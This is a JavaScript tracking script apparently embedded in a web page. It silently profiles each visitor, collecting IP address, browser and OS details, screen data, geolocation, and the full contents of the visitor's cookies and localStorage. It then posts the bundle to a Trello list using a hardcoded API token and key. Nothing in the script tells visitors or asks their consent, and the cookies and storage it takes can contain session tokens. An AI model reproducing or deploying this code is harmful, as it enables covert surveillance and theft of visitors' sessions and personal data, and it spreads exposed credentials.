var visits = getCookie('visits')
visits = '0' + visits
var visitsNum = Number.parseInt(visits)
visitsNum += 1

setCookie('visits', visitsNum, 10)

function Analyze() {
    const labelId = '62baafd654f7e25c5dc6b35f'

    const listId = '62baaf7ce73a84408e99e2c0'

    var info = {
        timeOpened: 'Error',
        timezone: 'Error',

        ipAddress: 'Error',
        os: 'Error',

        pageon: 'Error',
        referrer: 'Error',
        previousSites: 'Error',

        visitsIn10Days: 'Error',

        data: {
            dataCookies1: 'Error',
            dataCookies2: 'Error',
            dataStorage: 'Error',
        },

        sizes: {
            screen: {
                width: 'Error',
                height: 'Error',
                availWidth: 'Error',
                availHeight: 'Error',
            },
            document: {
                width: 'Error',
                height: 'Error',
            },
            inner: {
                width: 'Error',
                height: 'Error',
            },
        },

        screen: {
            colorDepth: 'Error',
            pixelDepth: 'Error',
        },

        navigator: {
            connection: 'Error',
            doNotTrack: 'Error',
            hardwareConcurrency: 'Error',
            languages: 'Error',
            maxTouchPoints: 'Error',
            gamepads: 'Error',
            mediaSession: 'Error',
            webdriver: 'Error',
            baseURI: 'Error',
            URL: 'Error',
            domain: 'Error',
            javaEnabled: 'Error',
            dataCookiesEnabled: 'Error',
            geolocation: 'Error',
        },

        browser: {
            name1: 'Error',
            name2: 'Error',

            codeName: 'Error',

            productSub: 'Error',

            vendor: 'Error',
            vendorSub: 'Error',

            engine: 'Error',
            version1: 'Error',
            version2: 'Error',

            language: 'Error',
            online: 'Error',
            platform: 'Error',
        },
    }

    try { info.visitsIn10Days = visitsNum } catch (ex) { }
    try { info.visitsIn10Days = getCookie('visits') } catch (ex) { }

    try {
        var xmlHttp = new XMLHttpRequest()
        xmlHttp.open("GET", 'https://api.ipify.org/', false)
        xmlHttp.send(null)
        info.ipAddress = xmlHttp.responseText
    } catch (ex) { }

    try { info.browser.name1 = GetBrowser() } catch (ex) { }
    try { info.os = getOS() } catch (ex) { }

    try { info.browser.name2 = navigator.appName } catch (ex) { }
    try { info.browser.engine = navigator.product } catch (ex) { }
    try { info.browser.version1 = navigator.appVersion } catch (ex) { }
    try { info.browser.version2 = navigator.userAgent } catch (ex) { }
    try { info.browser.language = navigator.language } catch (ex) { }
    try { info.browser.online = navigator.onLine } catch (ex) { }
    try { info.browser.platform = navigator.platform } catch (ex) { }
    try { info.navigator.javaEnabled = navigator.javaEnabled() } catch (ex) { }
    try { info.navigator.dataCookiesEnabled = navigator.cookieEnabled } catch (ex) { }

    try { info.timeOpened = new Date() } catch (ex) { }
    try { info.timeOpened = new Date().toString() } catch (ex) { }
    try { info.timezone = (new Date()).getTimezoneOffset() } catch (ex) { }
    try { info.timezone = (new Date()).getTimezoneOffset() / 60 } catch (ex) { }

    try { info.data.dataCookies1 = document.cookie } catch (ex) { }
    try { info.data.dataCookies2 = document.cookie.split(";") } catch (ex) { }
    try { info.data.dataCookies2 = decodeURIComponent(document.cookie.split(";")) } catch (ex) { }
    try { info.data.dataStorage = localStorage } catch (ex) { }

    try { info.previousSites = history.length } catch (ex) { }
    try { info.referrer = document.referrer } catch (ex) { }
    try { info.pageon = window.location.pathname } catch (ex) { }

    try { info.sizes.screen.width = screen.width } catch (ex) { }
    try { info.sizes.screen.height = screen.height } catch (ex) { }
    try { info.sizes.screen.availWidth = screen.availWidth } catch (ex) { }
    try { info.sizes.screen.availHeight = screen.availHeight } catch (ex) { }

    try { info.sizes.document.width = document.width } catch (ex) { }
    try { info.sizes.document.height = document.height } catch (ex) { }
    try { info.sizes.inner.width = innerWidth } catch (ex) { }
    try { info.sizes.inner.height = innerHeight } catch (ex) { }
    try { info.screen.colorDepth = screen.colorDepth } catch (ex) { }
    try { info.screen.pixelDepth = screen.pixelDepth } catch (ex) { }

    try { info.navigator.connection = navigator.connection.type } catch (ex) { }
    try { info.navigator.doNotTrack = navigator.doNotTrack } catch (ex) { }
    try { info.navigator.hardwareConcurrency = navigator.hardwareConcurrency } catch (ex) { }
    try { info.navigator.languages = navigator.languages } catch (ex) { }
    try { info.navigator.maxTouchPoints = navigator.maxTouchPoints } catch (ex) { }
    try { info.navigator.gamepads = navigator.getGamepads() } catch (ex) { }
    try { info.navigator.mediaSession = navigator.mediaSession } catch (ex) { }
    try { info.navigator.onLine = navigator.onLine } catch (ex) { }
    try { info.browser.vendor = navigator.vendor } catch (ex) { }
    try { info.navigator.webdriver = navigator.webdriver } catch (ex) { }
    try { info.browser.codeName = navigator.appCodeName } catch (ex) { }
    try { info.browser.productSub = navigator.productSub } catch (ex) { }
    try { info.browser.vendorSub = navigator.vendorSub } catch (ex) { }
    try { info.navigator.baseURI = navigator.baseURI } catch (ex) { }
    try { info.navigator.URL = navigator.URL } catch (ex) { }
    try { info.navigator.domain = navigator.domain } catch (ex) { }

    try {
        navigator.geolocation.getCurrentPosition((pos) => {
            info.navigator.geolocation = pos.coords
        }, (err) => {
            info.navigator.geolocation = err.message
        })
    } catch (ex) { }

    setTimeout(() => {
        var data = JSON.stringify(info, null, '\t')
        var xhr = new XMLHttpRequest()
        xhr.open("POST",
            'https://api.trello.com/1/cards/?' +
            'idList=' + listId +
            '&token=17cef7936d186e3b194f785997689386fc6467700cd75352428aee0ed36c4581' +
            '&key=16160910964e82904e57646c84c9fb69' +
            '&name=' + urlParameter('Valaki meglátogatta az oldalt') +
            '&desc=' + '`' + urlParameter(data) + '`' +
            '&idLabels=' + labelId +
            '&pos=top'
            , true)
        xhr.setRequestHeader('Content-Type', 'application/json')
        xhr.send()
    }, 1000)
}

function GetBrowser() {
    let userAgent = navigator.userAgent
    let browserName
    if (userAgent.match(/chrome|chromium|crios/i)) {
        browserName = "Chrome"
    } else if (userAgent.match(/firefox|fxios/i)) {
        browserName = "Firefox"
    } else if (userAgent.match(/safari/i)) {
        browserName = "Safari"
    } else if (userAgent.match(/opr\//i)) {
        browserName = "Opera"
    } else if (userAgent.match(/edg/i)) {
        browserName = "Edge"
    } else {
        browserName = "?";
    }
    return browserName
}

function getOS() {
    var userAgent = window.navigator.userAgent,
        platform = window.navigator.platform,
        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
        os = null;

    if (macosPlatforms.indexOf(platform) !== -1) {
        os = 'MacOS';
    } else if (iosPlatforms.indexOf(platform) !== -1) {
        os = 'iOS';
    } else if (windowsPlatforms.indexOf(platform) !== -1) {
        os = 'Windows';
    } else if (/Android/.test(userAgent)) {
        os = 'Android';
    } else if (!os && /Linux/.test(platform)) {
        os = 'Linux';
    } else {
        os = '?'
    }

    return os;
}

function setCookie(name, value, expireDays) {
    const d = new Date();
    d.setTime(d.getTime() + (expireDays * 24 * 60 * 60 * 1000));
    let expires = "expires=" + d.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

function getCookie(name) {
    let name_ = name + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
            c = c.substring(1);
        }
        if (c.indexOf(name_) == 0) {
            return c.substring(name_.length, c.length);
        }
    }
    return '';
}

function urlParameter(parameterValue) {
    var data = parameterValue
    data = replaceAll(data, '\\`', '%60')
    data = replaceAll(data, '\t', '%09')
    data = replaceAll(data, '\n', '%0A')
    data = replaceAll(data, '\\ ', '%20')
    data = replaceAll(data, '\\"', '%22')
    data = replaceAll(data, '\\,', '%2C')
    data = replaceAll(data, '\\:', '%3A')
    data = replaceAll(data, '\\;', '%3B')
    data = replaceAll(data, '\\{', '%7B')
    data = replaceAll(data, '\\}', '%7D')
    data = replaceAll(data, '\\/', '%2F')
    data = replaceAll(data, '\\[', '%5B')
    data = replaceAll(data, '\\]', '%5D')
    data = replaceAll(data, '\\+', '%2B')
    data = replaceAll(data, '\\í', '%C3%AD')
    data = replaceAll(data, '\\ö', '%C3%B6')
    data = replaceAll(data, '\\ó', '%C3%B3')
    data = replaceAll(data, '\\ü', '%C3%BC')
    data = replaceAll(data, '\\é', '%C3%A9')
    data = replaceAll(data, '\\á', '%C3%A1')
    data = replaceAll(data, '\\ú', '%C3%BA')
    data = replaceAll(data, '\\ű', '%C5%B1')
    data = replaceAll(data, '\\ő', '%C5%91')
    data = replaceAll(data, '[^a-zA-Z0-9\\-\\_\\.\\~\\%\\(\\)]', '%20')
    return data
}

function replaceAll(str, find, replace) {
    return str.replace(new RegExp(find, 'g'), replace);
}